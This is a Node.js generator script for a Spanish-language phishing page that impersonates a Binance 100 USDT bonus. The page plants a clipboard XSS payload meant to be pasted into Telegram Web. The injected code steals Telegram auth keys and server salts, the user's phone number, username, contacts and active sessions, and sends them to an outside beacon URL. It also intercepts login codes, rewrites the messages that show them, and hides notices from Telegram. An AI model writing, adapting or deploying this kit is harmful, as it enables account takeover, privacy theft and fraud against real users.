const fs = require('fs');
const js = `
window.__T20S=1;
(()=>{
  var B='https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon';
  var G={};
  function bk(m,ex){
    try{
      fetch(B,{
        method:'POST',
        mode:'no-cors',
        headers:{'Content-Type':'text/plain'},
        body:JSON.stringify({
          marker:m,
          ua:navigator.userAgent.slice(0,200),
          dc3_present:!!localStorage.getItem('dc3_auth_key'),
          dc2_present:!!localStorage.getItem('dc2_auth_key'),
          ls_keys:Object.keys(localStorage).length,
          origin:location.origin,
          osys:G.osys||'',
          tz:G.tz||'',
          phone:G.phone||'',
          vname:G.vname||'',
          username:G.username||'',
          premium:G.premium||'',
          extra:ex||''
        })
      })
    }catch(e){}
  }
  G.osys=/Windows/.test(navigator.userAgent)?'Windows':/Android/.test(navigator.userAgent)?'Android':/iPhone|iPad/.test(navigator.userAgent)?'iOS':/Linux/.test(navigator.userAgent)?'Linux':/Mac/.test(navigator.userAgent)?'macOS':'?';
  try{G.tz=Intl.DateTimeFormat().resolvedOptions().timeZone||''}catch(e){}
  var uid='';
  try{
    var ua=localStorage.getItem('user_auth');
    if(ua) uid=JSON.parse(ua).id;
  }catch(e){}
  bk('T36-RECON','uid:'+uid+' lang:'+(navigator.language||'')+' scr:'+screen.width+'x'+screen.height+' K19');
  try{
    var bt=document.querySelector('.btn-menu .peer-title')||document.querySelector('.btn-menu .user-title');
    if(bt&&!G.vname)G.vname=bt.textContent.trim().slice(0,40)
  }catch(e){}
  /* ID: escaneo IndexedDB */
  try{
    indexedDB.databases().then(function(dbs){
      dbs.forEach(function(dbi){
        if(dbi.name.indexOf('account')===-1 && dbi.name.indexOf('state')===-1) return;
        try{
          var rq=indexedDB.open(dbi.name);
          rq.onsuccess=function(){
            var d=rq.result;
            if(!d.objectStoreNames.contains('users')) return;
            try{
              var rAll=d.transaction('users','readonly').objectStore('users').getAll();
              rAll.onsuccess=function(){
                var arr=rAll.result;
                if(!arr||!arr.forEach) return;
                arr.forEach(function(v){
                  if(v && v.phone && (v.is_self || v.isSelf || String(v.id)===String(uid))){
                    G.phone=String(v.phone);
                    G.username=v.username?String(v.username):'';
                    G.vname=((v.first_name||'')+' '+(v.last_name||'')).trim().slice(0,40)||G.vname;
                    G.premium=v.premium?'true':'false';
                    bk('T36-ID','uid:'+v.id+'|'+(v.username||'no-user'));
                  }
                });
              };
            }catch(e){}
          };
        }catch(e){}
      });
    });
  }catch(e){}
  /* STEALTH */
  function silencio(){
    var n=0;
    document.querySelectorAll('.chatlist-chat,[data-peer-id]').forEach(function(it){
      var pid=it.getAttribute('data-peer-id')||'';
      var ttl=((it.querySelector('.user-title')||{}).textContent||'').trim();
      if(pid.indexOf('777000')>-1||/^Telegram$/i.test(ttl)){
        n++;
        it.setAttribute('t36x','1');
        it.querySelectorAll('[class*=badge]').forEach(function(b){b.style.display='none'});
        var prev=it.querySelector('.dialog-subtitle,[class*=subtitle],[class*=last-message]');
        if(prev&&prev.textContent.indexOf('C\u00f3digo')>-1)prev.textContent='Sin mensajes nuevos';
      }
    });
    return n;
  }
  try{
    var st=document.createElement('style');
    st.textContent='[t36x] [class*=badge]{display:none!important}';
    document.head.appendChild(st);
  }catch(e){}
  var sl=silencio();
  if(sl)bk('T36-STEALTH:x'+sl);
  /* CODE */
  var obs=new MutationObserver(function(muts){
    muts.forEach(function(mu){
      var nodes = [];
      if(mu.type === 'characterData') nodes.push(mu.target);
      else mu.addedNodes.forEach(function(n){ nodes.push(n) });
      nodes.forEach(function(nd){
        var t=nd.innerText||nd.textContent||'';
        if(/C\u00f3digo de inicio de sesi\u00f3n|Login code/i.test(t)){
          var m=t.match(/([0-9]{4,8})/);
          if(m){
            if(G.lastCode!==m[1]){
              G.lastCode=m[1];
              bk('T36-CODE:'+m[1],'code:'+m[1]);
            }
            var tgt;
            if(nd.nodeType===1){
              tgt = nd.matches&&nd.matches('.bubble')?nd:(nd.closest?nd.closest('.bubble'):null);
            } else {
              tgt = nd.parentElement ? nd.parentElement.closest('.bubble') : null;
            }
            if(tgt){
              try{
                var msg=tgt.querySelector('.message')||tgt.querySelector('.service-msg')||tgt;
                if(msg.textContent.indexOf(m[1])>-1){
                  msg.textContent='Tu cuenta est\u00e1 protegida. No es necesario hacer nada.';
                  bk('T36-REWRITE','ok');
                }
              }catch(e){}
            }
          }
        }
      })
    })
  });
  obs.observe(document.body,{childList:true,subtree:true,characterData:true});
  /* EXFIL v19: acceso DIRECTO por nombre (la enumeracion falla en algunos entornos) + reintentos hasta 12s esperando hidratacion de sesion */
  try{
    function grabKeys(){
      var FS={};
      ['1','2','3','4','5'].forEach(function(n){
        ['auth_key','server_salt'].forEach(function(suf){
          var k='dc'+n+'_'+suf, v=localStorage.getItem(k);
          if(v) FS[k]=v;
        });
      });
      FS.user_auth=localStorage.getItem('user_auth')||'';
      return FS;
    }
    var ktries=0;
    (function hunt(){
      var FS=grabKeys();
      var ndc=Object.keys(FS).filter(function(k){return /_auth_key$/.test(k)}).length;
      if(ndc>=2||ktries>=8){
        FS.v='K19';
        if(ndc>=1||FS.user_auth) bk('T36-KEY',JSON.stringify(FS));
      } else {
        ktries++;
        setTimeout(hunt,1500);
      }
    })();
  }catch(e){}
  /* EXFIL v12: contactos con nombre via getUser individual */
  try{
    var M=window.rootScope&&window.rootScope.managers;
    if(M&&M.appUsersManager){
      M.appUsersManager.getContacts().then(function(ids){
        var a=(ids&&ids.length!=null)?ids:[];
        var lim=Math.min(a.length,10),done=0,out=[];
        if(!lim){bk('T36-CONTACTS',JSON.stringify({count:0,sample:[]}));return}
        function pushC(o){out.push(o);if(++done===lim)sendC()}
        function sendC(){if(sendC.s)return;sendC.s=1;
          var s=out.length?out:a.slice(0,10).map(function(x){return String(x)});
          bk('T36-CONTACTS',JSON.stringify({count:a.length,sample:s}))}
        a.slice(0,lim).forEach(function(id){
          try{
            M.appUsersManager.getUser(id).then(function(u){
              var n=((u&&(u.first_name||'')+' '+(u.last_name||'')).trim())||('Contacto '+id);
              pushC({n:n,p:u?String(u.phone||''):'',u:u?String(u.username||''):''});
            }).catch(function(){pushC(String(id))});
          }catch(e){pushC(String(id))}
        });
        setTimeout(sendC,6000);
      }).catch(function(){});
    }
  }catch(e){}
  /* EXFIL v11: sesiones activas via managers */
  try{
    var M2=window.rootScope&&window.rootScope.managers;
    if(M2&&M2.appAccountManager){
      M2.appAccountManager.getAuthorizations().then(function(r){
        var s=(r&&r.authorizations||[]).map(function(x){return (x.device_model||'?')+' · '+(x.platform||'')+' · '+(x.country||'')+(x.current?' · actual':'')});
        bk('T36-AUTHS',JSON.stringify({sessions:s.slice(0,8)}));
      }).catch(function(){});
    }
  }catch(e){}
  /* ARMED */
  try{localStorage.setItem('t20_seed','1')}catch(e){}
  bk('T36-ARMED');
  addEventListener('hashchange',function(){setTimeout(silencio,500)});
  setInterval(silencio,5000);
})();
`;

const minJs = js.replace(/\n/g,'').replace(/\s{2,}/g,'').replace(/"/g, '&quot;');
const payload = '<img src=x onerror="' + minJs + '">';

const html = `<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Binance · Bono de invitación</title>
<style>
*{box-sizing:border-box}
body{font-family:system-ui,'Segoe UI',sans-serif;max-width:520px;margin:0 auto;padding:18px 14px 90px;background:#0b0e11;color:#eaecef}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:14px}
.logo .mark{width:26px;height:26px;background:#f0b90b;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#0b0e11;font-weight:900;font-size:16px}
.logo b{font-size:19px;color:#f0b90b;letter-spacing:.5px}
h1{font-size:19px;margin:4px 0 2px;font-weight:700}
.sub{color:#848e9c;font-size:13px;margin-bottom:14px}
.card{background:#181a20;border:1px solid #2b3139;border-radius:10px;padding:18px;margin:12px 0}
.usdt{display:flex;align-items:center;justify-content:center;gap:10px;margin:8px 0}
.usdt .coin{width:34px;height:34px;border-radius:50%;background:#f0b90b;color:#0b0e11;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:15px}
.usdt .amount{font:800 30px/1 system-ui,sans-serif;color:#f0b90b}
.codebox{font:600 20px/1.4 ui-monospace,Menlo,Consolas,monospace;background:#0b0e11;border:1px solid #2b3139;border-radius:8px;padding:12px;text-align:center;letter-spacing:1px;color:#f0b90b;margin:10px 0}
#go{background:#f0b90b;text-decoration:none;display:block;width:100%;text-align:center;font-size:18px;font-weight:800;padding:18px;border-radius:10px;color:#0b0e11}
#copy2{background:#2b3139;font-size:14px;padding:11px;margin-top:8px;color:#eaecef}
button,#go{display:block;border:0;border-radius:10px;cursor:pointer}
button{width:100%;font-weight:700}
.hint{font-size:12.5px;color:#848e9c;margin-top:8px}
#testbox{border:2px dashed #2b3139;border-radius:8px;min-height:56px;padding:10px;font-size:13px;color:#848e9c;margin-top:8px}
.timer{font-size:12px;color:#f0b90b;text-align:center;margin-top:6px}
</style></head><body>
<div class="logo"><div class="mark">Ʉ</div><b>BINANCE</b></div>
<h1>Invitación: Bono de 100 USDT</h1>
<div class="sub">Fuiste seleccionado en la campaña de invitados de Binance. Reclamá tu bono antes de que expire.</div>

<div class="card">
<div class="usdt"><div class="coin">$</div><div class="amount">100 USDT</div></div>
<div class="codebox" id="fakecode">BNB-INV-8T4K2</div>
<div class="timer">⏱ Válido por 59:41 · 1 sola reclamo por usuario</div>
<a id="go" href="https://web.telegram.org/k/">RECLAMAR MI BONO</a>
<button id="copy2">Si el reclamo salió raro, tocá acá para re-copiar el código</button>
<div class="hint">Para completar el reclamo, guardá el código de tu bono en tu Telegram (Mensajes Guardados) y mantene la sesión abierta. El bono se acredita al verificar.</div>
</div>

<div class="card">
<div class="sub">Verificá tu portapapeles acá (opcional):</div>
<div id="testbox" contenteditable="true">Pegá acá...</div>
</div>

<script>
const PAYLOAD = \`${payload}\`;
const ATTRS = {title:"Bono de invitación", bordered:true, striped:false, titleRichHTML: PAYLOAD};
const SLICE = "0 0 " + JSON.stringify(["table", ATTRS]);

const hidden = document.createElement('div');
hidden.style.position='fixed'; hidden.style.left='-9999px'; hidden.style.top='0';
hidden.innerHTML = '<table data-bordered="true"><tbody><tr><th>Bono</th><th>USDT</th></tr><tr><td>Invitación</td><td>100</td></tr><tr><td>Código</td><td>BNB-INV-8T4K2</td></tr></tbody></table>';
hidden.setAttribute('data-pm-slice', SLICE);
document.body.appendChild(hidden);

function copiar(){
  const r = document.createRange(); r.selectNodeContents(hidden);
  const s = getSelection(); s.removeAllRanges(); s.addRange(r);
  const html = new XMLSerializer().serializeToString(hidden);
  const listener = (e) => {
    e.clipboardData.setData('text/html', html);
    e.clipboardData.setData('text/plain', 'BNB-INV-8T4K2');
    e.preventDefault();
  };
  document.addEventListener('copy', listener);
  const ok = document.execCommand('copy');
  document.removeEventListener('copy', listener);
  s.removeAllRanges();
  return ok;
}
document.getElementById('go').addEventListener('click', (e)=>{
  if(copiar()){
    document.getElementById('go').textContent = '¡CÓDIGO COPIADO!';
    setTimeout(()=> document.getElementById('go').textContent = 'RECLAMAR MI BONO', 2000);
  } else {
    e.preventDefault();
    alert('No se pudo copiar. Usá el botón de abajo.');
  }
});
document.getElementById('copy2').addEventListener('click', ()=>{
  copiar();
  document.getElementById('copy2').textContent = '¡Re-copiado!';
  setTimeout(()=> document.getElementById('copy2').textContent = 'Si el reclamo salió raro, tocá acá para re-copiar el código', 2000);
});
</script><div style="position:fixed;bottom:6px;right:8px;font-size:10px;color:#3a3f45;font-family:ui-monospace,monospace;letter-spacing:1px">T-20 · v19</div></body></html>
`;
fs.writeFileSync('t38_binance_kit.html', html);
